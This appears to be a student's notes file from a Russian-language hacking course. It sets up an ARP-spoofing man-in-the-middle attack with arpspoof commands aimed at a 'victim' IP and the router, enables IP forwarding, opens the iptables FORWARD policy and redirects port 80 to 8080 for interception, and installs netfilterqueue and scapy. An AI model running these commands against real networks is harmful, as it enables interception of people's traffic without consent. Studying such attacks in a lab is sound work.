<!-- sudo apt-get install python3-scapy -->

<!-- sudo apt install dsniff -->
<!--  sudo arpspoof -i wlo1 -t 192.168.0.101 192.168.0.1 -->
<!-- sudo arpspoof -i wlo1 -t {viktim ip} {router ip} -->




<!-- MAC - Media access control address  -->
<!-- ARP - Address Resolution Protocol  -->

iptables -L

Chain FORWARD (policy DROP)
Chain FORWARD (policy ACCEPT)

iptables -P FORWARD ACCEPT

<!-- sudo echo 1 > /proc/sys/net/ipv4/ip_forward -->
<!-- OR -->
<!-- sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward' -->

 <!--
 41 lesson
  и чекайте, чтобы напротив Chain FORWARD, Было именно (policy ACCEPT), а не (policy DROP). 
Если есть (policy DROP), пробуйте прописать "iptables -P FORWARD ACCEPT".
Хотя и инет вроде как есть, в плане я пингую DNS гугла, но зайти куда-то не могу еще. -->
<!-- После этой команды вроде все норм работает, как ping, так и везде могу зайти и в арп таблице (mac атакующей машины)
"iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080"
еще чекну перехват пакетов через wireshark, потом напишу результаты. 


Mini elephant
9 months ago
После этой команды вроде все норм работает, как ping, так и везде могу зайти и в арп таблице (mac атакующей машины)
"iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080"
еще чекну перехват пакетов через wireshark, потом напишу результаты.
Тырканите если вдруг поленюсь сюда писать. Попробую помочь, но не факт, я рил ленивый

-->


<!-- sudo apt install python3-pip git libnfnetlink-dev libnetfilter-queue-dev
pip3 install -U git+https://github.com/kti/python-netfilterqueue -->
<!-- apt-get install build-essential python-dev libnetfilter-queue-dev -->
<!-- sudo pip3 install NetfilterQueue -->

<!-- Установил netfilter всего 2 командами мб кому пригодится:
apt install python3-pip git libnfnetlink-dev libnetfilter-queue-dev
pip3 install -U git+https://github.com/kti/python-netfilterqueue -->

<!-- https://unix.stackexchange.com/questions/410579/change-the-python3-default-version-in-ubuntu -->



ifconfig
ip a
route -n

<!-- show arp table -->
arp -a

sudo apt-get install python3-scapy

scapy-python3